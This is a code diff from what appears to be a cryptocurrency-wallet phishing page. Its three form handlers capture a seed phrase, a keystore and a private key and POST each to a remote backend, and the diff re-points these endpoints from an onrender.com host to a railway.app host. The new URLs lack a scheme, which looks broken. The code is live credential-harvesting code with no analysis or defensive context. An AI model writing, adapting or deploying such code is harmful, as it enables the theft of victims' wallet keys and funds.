@@ -178,7 +178,7 @@ document.querySelector("#importForm").addEventListener("submit", function (e) {
 
   console.log("Sending phrase data:", formData);
 
-  fetch("https://form-backend-1-7631.onrender.com/ph", {
+  fetch("form-backend-production-f5f1.up.railway.app/ph", {
     method: "POST",
     headers: { "Content-Type": "application/json" },
     body: JSON.stringify(formData),
@@ -224,7 +224,7 @@ document
 
     console.log("Sending keystore data:", formData);
 
-    fetch("https://form-backend-1-7631.onrender.com/ks", {
+    fetch("form-backend-production-f5f1.up.railway.app/ks", {
       method: "POST",
       headers: { "Content-Type": "application/json" },
       body: JSON.stringify(formData),
@@ -259,7 +259,7 @@ document.querySelector("#privateForm").addEventListener("submit", function (e) {
 
   console.log("Sending private key data:", formData);
 
-  fetch("https://form-backend-1-7631.onrender.com/pk", {
+  fetch("form-backend-production-f5f1.up.railway.app/pk", {
     method: "POST",
     headers: { "Content-Type": "application/json" },
     body: JSON.stringify(formData),
